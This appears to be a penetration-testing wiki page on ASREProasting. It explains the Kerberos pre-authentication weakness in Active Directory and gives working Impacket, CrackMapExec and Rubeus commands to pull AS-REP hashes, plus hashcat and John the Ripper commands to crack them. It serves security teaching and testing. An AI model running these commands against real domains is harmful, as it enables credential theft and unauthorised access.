# ASREProast

## Theory

The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to **ASREProast**).

The pre-authentication requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from the user password. Technically, when asking the KDC (Key Distribution Center) for a TGT (Ticket Granting Ticket), the requesting user needs to validate pre-authentication by sending a timestamp encrypted with it's own credentials. It ensures the user is requesting a TGT for himself. Once validated, the TGT is then sent to the user in the `KRB_AS_REP` message, but that message also contains a session key. That session key is encrypted with the requested user's NT hash.

Because some applications don't support Kerberos preauthentication, it is common to find users with Kerberos preauthentication disabled, hence allowing attackers to request TGTs for these users and crack the session keys offline. This is ASREProasting.

While this technique can possibly allow to retrieve a user's credentials, the TGT obtained in the `KRB_AS_REP` messages are encrypted cannot be used without knowledge of the account's password.

## Practice

{% hint style="info" %}
While this attack can be carried out without any prior foothold (domain user credentials), there is no way of finding out users with `Do not require Kerberos preauthentication` set without that prior foothold.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) (Python) can get TGTs for the users that have the property `Do not require Kerberos preauthentication` set.

```bash
# users list dynamically queried with an LDAP anonymous bind
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'

# with a users file
GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'

# users list dynamically queried with a LDAP authenticated bind (password)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# users list dynamically queried with a LDAP authenticated bind (NT hash)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python).

```bash
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
```

The [kerberoast](https://github.com/skelsec/kerberoast) pure-python toolkit is a good alternative to the tools mentioned above.
{% endtab %}

{% tab title="Windows" %}
The same thing can be done with [Rubeus](https://github.com/GhostPack/Rubeus) from a session running with a domain user privileges.

```bash
Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
```
{% endtab %}
{% endtabs %}

Depending on the output format used (`hashcat` or `john`), [hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can be used to try [cracking the hashes](../credentials/cracking.md).

```bash
hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
```

```bash
john --wordlist=$wordlist ASREProastables.txt
```

## Resources

{% embed url="https://blog.xpnsec.com/kerberos-attacks-part-2/" %}

{% embed url="https://blog.harmj0y.net/activedirectory/roasting-as-reps/" %}

{% embed url="https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx" %}

{% embed url="https://en.hackndo.com/kerberos" %}
